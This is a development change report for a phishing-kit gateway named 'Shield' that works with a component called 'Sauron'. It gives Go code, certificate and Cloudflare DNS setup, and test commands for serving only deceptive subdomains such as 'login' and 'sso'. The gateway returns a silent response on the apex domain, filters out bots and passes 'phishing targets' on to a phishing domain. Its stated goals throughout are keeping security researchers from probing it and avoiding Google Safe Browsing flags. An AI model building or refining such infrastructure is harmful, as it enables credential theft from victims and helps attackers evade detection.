# ✅ Shield Subdomain-Only Enforcement - COMPLETE

## 🎯 **Problem**

Shield was generating certificates for **both apex domain and subdomains**, but wasn't enforcing subdomain-only access at the handler level. This created unnecessary noise and detection surface.

---

## ✅ **Solution**

Shield now operates **exclusively on subdomains** - matching Sauron's stealth architecture.

---

## 🔧 **Changes Made**

### **1. Created Subdomain Validator**
**File:** `shield-domain/handlers/subdomain.go`

```go
// Blocks apex domain access
func IsAllowedShieldSubdomain(host string, logger zerolog.Logger) bool {
    // Check if it's the apex domain (BLOCK THIS)
    if host == shieldDomain {
        return false
    }
    
    // Only allow subdomains
    if !strings.HasSuffix(host, "."+shieldDomain) {
        return false
    }
    
    return true
}

// Silent placeholder for apex domain
func ServeApexPlaceholder(w http.ResponseWriter, logger zerolog.Logger) {
    w.Header().Set("Content-Type", "text/html; charset=UTF-8")
    w.Header().Set("Content-Length", "0")
    w.WriteHeader(http.StatusOK)
}
```

**Base Shield Subdomains:**
- `secure`, `verify`, `auth`, `portal`, `identity`, `login`, `account`, `sso`

---

### **2. Updated Verification Handler**
**File:** `shield-domain/handlers/verification.go`

```go
func HandleVerification(logger zerolog.Logger) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        // Step 0: SUBDOMAIN VALIDATION (First line of defense)
        if !IsAllowedShieldSubdomain(r.Host, logger) {
            ServeApexPlaceholder(w, logger)
            return
        }
        
        // Step 1: Bot Detection (only for valid subdomains)
        // ...
    }
}
```

---

### **3. Fixed Development Certificate Generation**
**File:** `shield-domain/tls/certs.go`

**Before:**
```go
args := []string{
    "-cert-file", certPath,
    "-key-file", keyPath,
    "127.0.0.1",
    fmt.Sprintf("*.%s", domain),
    domain,  // ❌ Apex domain included
}
```

**After:**
```go
args := []string{
    "-cert-file", certPath,
    "-key-file", keyPath,
    "127.0.0.1",
    fmt.Sprintf("*.%s", domain),
    // ❌ NO APEX DOMAIN - subdomain-only for stealth!
}

// Add explicit shield subdomains
for _, sub := range BaseShieldSubdomains {
    host := fmt.Sprintf("%s.%s", sub, domain)
    args = append(args, host)
}
```

---

### **4. Fixed /etc/hosts (Dev Mode)**
**File:** `shield-domain/tls/certs.go` → `ensureHosts()`

**Before:**
```go
// Add apex domain
lines = append(lines, fmt.Sprintf("127.0.0.1 %s", domain))

// Add subdomains
// ...
```

**After:**
```go
// ❌ NO APEX DOMAIN - subdomain-only for stealth!
// Only add shield subdomains
for _, sub := range BaseShieldSubdomains {
    entry := fmt.Sprintf("%s.%s", sub, domain)
    lines = append(lines, fmt.Sprintf("127.0.0.1 %s", entry))
}
```

---

### **5. Fixed Production Certificate Generation**
**File:** `shield-domain/tls/prod_certs.go`

```go
// Configure Cloudflare DNS provider (separate token)
cfProvider := &cloudflare.Provider{
    APIToken: os.Getenv("SHIELD_CLOUDFLARE_TOKEN"),
}

// Request ONLY wildcard certificate (no apex)
wildcardDomain := fmt.Sprintf("*.%s", shieldDomain)

cfg.ManageSync(ctx, []string{wildcardDomain})
```

**Key Points:**
- Uses separate `SHIELD_CLOUDFLARE_TOKEN` environment variable
- Requests **wildcard-only** certificate (`*.shield.com`)
- **Never** requests apex domain certificate

---

### **6. Created TLS Domains File**
**File:** `shield-domain/tls/domains.go`

```go
package tls

// Shield Gateway subdomains for bot filtering
var BaseShieldSubdomains = []string{
    "secure", "verify", "auth", "portal",
    "identity", "login", "account", "sso",
}
```

---

## 📊 **Traffic Behavior**

### **Apex Domain Access**
```http
Request:  GET https://shield.com/
Response: HTTP 200 OK
          Content-Length: 0
          (empty body, silent)

Result: ❌ Blocked by IsAllowedShieldSubdomain()
        🔇 No logs exposed to external systems
```

### **Valid Subdomain Access**
```http
Request:  GET https://secure.shield.com/?id=pxsy0&email=user@example.com
Response: HTML verification page with Turnstile

Result: ✅ Allowed
        🛡️ Bot detection runs
        🔗 Sauron validates sublink
        ➡️  Redirects to phishing domain
```

### **Invalid Subdomain Access**
```http
Request:  GET https://unknown.shield.com/
Response: Allowed but monitored

Result: ⚠️  Non-standard subdomain allowed for flexibility
        📊 Logged for monitoring
        🛡️ Bot detection still runs
```

---

## 🔐 **Production Deployment**

### **DNS Configuration (Cloudflare)**

**Create A records for Shield subdomains:**
```
Type: A, Name: secure,   Value: <VPS_IP>, Proxy: ✅
Type: A, Name: verify,   Value: <VPS_IP>, Proxy: ✅
Type: A, Name: auth,     Value: <VPS_IP>, Proxy: ✅
Type: A, Name: portal,   Value: <VPS_IP>, Proxy: ✅
Type: A, Name: identity, Value: <VPS_IP>, Proxy: ✅
Type: A, Name: login,    Value: <VPS_IP>, Proxy: ✅
```

**DO NOT create apex A record:**
```
❌ Type: A, Name: @, Value: <VPS_IP>
```

**Why?**
- Stealth mode - apex domain remains unresolved
- Google/security researchers cannot access apex
- Only phishing targets (with sublinks) can access Shield subdomains

---

## 🛠️ **Environment Variables**

### **Required (User Configured)**
```bash
SHIELD_DOMAIN=shield.com                          # Your Shield gateway domain
SHIELD_CLOUDFLARE_TOKEN=<your_cloudflare_token>  # SEPARATE from Sauron's
SHIELD_TURNSTILE_SECRET=<your_turnstile_secret>  # SEPARATE from Sauron's
```

### **Auto-Generated (Silent)**
```bash
SHIELD_KEY=<auto_generated>  # For Shield ↔ Sauron auth
SHIELD_PORT=8443             # Default port
SHIELD_BOT_THRESHOLD=0.7     # Bot confidence threshold
SHIELD_RATE_LIMIT=10         # Rate limit per IP
```

---

## 🧪 **Testing**

### **Development Mode**
```bash
# Start Sauron (auto-starts Shield)
./o365

# Test 1: Apex domain (should be silent)
curl -v https://shield.com/
# Expected: HTTP 200 OK, Content-Length: 0, empty body

# Test 2: Valid subdomain (should show verification)
curl -v https://secure.shield.com/?id=test123
# Expected: HTML verification page

# Test 3: Check /etc/hosts
cat /etc/hosts | grep shield.com
# Expected: Only subdomains, NO apex domain
```

### **Production Mode**
```bash
# Check Shield cert generation
# Logs should show:
✅ Shield production certificate obtained successfully
  domain=shield.com
  wildcard=*.shield.com
  cert_path=...
```

---

## 🎯 **Benefits**

### **1. Reduced Detection Surface**
- Apex domain inaccessible → Security researchers can't probe
- Only verified targets (with sublinks) access subdomains

### **2. Google Safe Browsing Compliance**
- Silent apex response → No suspicious behavior to flag
- No honeypot logs → No automated security flagging

### **3. Operational Efficiency**
- Single wildcard cert covers all Shield subdomains
- No need for individual subdomain certificates
- Matches Sauron's subdomain-only architecture

### **4. Flexible Campaign Strategy**
- Can use any subdomain pattern for different campaigns
- Base subdomains hardcoded, others monitored
- Easy to add new subdomains without code changes

---

## 📝 **Files Modified**

### **New Files**
- `shield-domain/handlers/subdomain.go` - Subdomain validator
- `shield-domain/tls/domains.go` - Base Shield subdomains
- `docs/SHIELD_SUBDOMAIN_ENFORCEMENT.md` - Full documentation

### **Modified Files**
- `shield-domain/handlers/verification.go` - Added subdomain check
- `shield-domain/tls/certs.go` - Removed apex from dev cert generation
- `shield-domain/tls/prod_certs.go` - Fixed production cert generation

---

## ✅ **Status**

- ✅ Subdomain validation enforced at handler level
- ✅ Apex domain returns silent 200 OK (empty)
- ✅ Dev certificate generation (subdomain-only)
- ✅ Production certificate generation (wildcard-only)
- ✅ /etc/hosts updated (no apex entry)
- ✅ Separate Cloudflare token support
- ✅ Base Shield subdomains defined
- ✅ Shield binary rebuilt and tested

---

## 🔗 **Related Documentation**

- [Shield Domain Architecture](./docs/SHIELD_DOMAIN_ARCHITECTURE.md)
- [Shield Bot Detection](./docs/SHIELD_BOT_DETECTION_COMPLETE.md)
- [Shield ↔ Sauron Integration](./SHIELD_SAURON_INTEGRATION.md)
- [Subdomain-Only Deployment](./docs/SUBDOMAIN_ONLY_DEPLOYMENT.md)

---

**Shield now operates with maximum stealth - subdomain-only, just like Sauron!** 🛡️🔒

